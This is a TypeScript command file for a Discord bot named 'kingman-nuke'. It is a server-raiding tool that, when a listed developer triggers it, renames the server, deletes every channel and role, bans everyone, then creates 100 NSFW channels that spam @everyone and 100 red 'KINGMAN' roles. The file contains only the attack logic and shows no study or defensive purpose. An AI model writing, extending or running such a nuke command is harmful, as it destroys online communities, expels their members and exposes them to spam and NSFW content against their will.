import { Command } from '../../KINGMAN_NUKE/types/KING-NUKE';
export default {
    name: "kingman-nuke",
    description: "",
    run: async(client, kmsg, args, kingman)=> {
        if(!client.config.devs.includes(kmsg.author.id)) return console.log("not dev");
        if(!kmsg.guild) return;
        await kingman.ChangerServerInfo(kmsg.guild).catch(e=> {
            console.log(e)
        })
        await kingman.clearChannels(kmsg.guild).catch(e=> {
            console.log(e)
        })
        await kingman.clearRoles(kmsg.guild).catch(e=> {
            console.log(e)
        })
        await kingman.banEveryone(kmsg.guild).catch(e=> {
            console.log(e)
        })
        let ops = { 
            channels: {
                name: "kingman",
                nsfw: true,
                number: 100,
                topic: "KINGMAN HERE SAY GOODNIGHT :)"
            },
            messages: {
                content: "> @everyone KINGMAN NUKE SYSTEM",
                number: 25
            }
        }
        await kingman.CreateChannels(kmsg.guild, ops).catch(e=> {
            console.log(e)
        })
        let ops2 = { 
            name: "KINGMAN",
            color: "RED",
            number: 100
        }
        await kingman.createRoles(kmsg.guild, ops2).catch(e=> {
            console.log(e)
        })

    } 
} as Command
